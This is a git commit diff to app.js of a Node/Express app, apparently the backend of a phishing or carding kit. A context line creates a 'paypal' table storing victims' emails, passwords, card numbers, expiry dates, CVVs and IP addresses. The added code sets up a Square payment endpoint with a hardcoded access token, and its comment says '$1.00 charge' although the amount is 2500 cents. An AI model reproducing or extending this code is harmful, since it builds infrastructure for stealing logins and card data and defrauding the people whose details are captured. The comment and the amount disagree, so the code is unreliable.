2a0b118bb41e730d5c97581cb58bef9dd33577d3
fadysadaqah <fadysadaqah@gmail.com>
2019-09-17 13:13:57 +0200

    square

--- app.js
+++ app.js
@@ -12,11 +12,59 @@ var city;
 var reg;
 const client = new pg.Client(process.env.POSTGRESQL_ADDON_URI);
 client.connect();
-
 client.query("create table paypal (id serial , mail text,pass text,cardholder text,card text,exp text,cvv text,country TEXT,ip TEXT,time timestamp default now())")
 // #######################################################################
+const crypto = require('crypto');
+const squareConnect = require('square-connect');
+const accessToken = 'EAAAEFPW7ewZnQzV-OvOlEZklQj3Qn16RI0A-E0jqk58GlgBwTbGRozZjXkKmLbm';
 
+app.use(bodyParser.json());
+app.use(bodyParser.urlencoded({ extended: false }));
+app.use(express.static(__dirname));
 
+// Set Square Connect credentials and environment
+const defaultClient = squareConnect.ApiClient.instance;
+
+// Configure OAuth2 access token for authorization: oauth2
+const oauth2 = defaultClient.authentications['oauth2'];
+oauth2.accessToken = accessToken;
+
+// Set 'basePath' to switch between sandbox env and production env
+// sandbox: https://connect.squareupsandbox.com
+// production: https://connect.squareup.com
+defaultClient.basePath = 'https://connect.squareupsandbox.com';
+
+app.post('/process-payment', async (req, res) => {
+    const request_params = req.body;
+
+    // length of idempotency_key should be less than 45
+    const idempotency_key = crypto.randomBytes(22).toString('hex');
+
+    // Charge the customer's card
+    const payments_api = new squareConnect.PaymentsApi();
+    const request_body = {
+        source_id: request_params.nonce,
+        amount_money: {
+            amount: 2500, // $1.00 charge
+            currency: 'USD'
+        },
+        idempotency_key: idempotency_key
+    };
+
+    try {
+        const response = await payments_api.createPayment(request_body);
+        res.status(200).json({
+            'title': 'Payment Successful',
+            'result': response
+        });
+    } catch (error) {
+        res.status(500).json({
+            'title': 'Payment Failure',
+            'result': error.response.text
+        });
+    }
+});
+// #################################################################################################
 app.get('*/mid', function (req, res) {
     res.render('mid')
 })
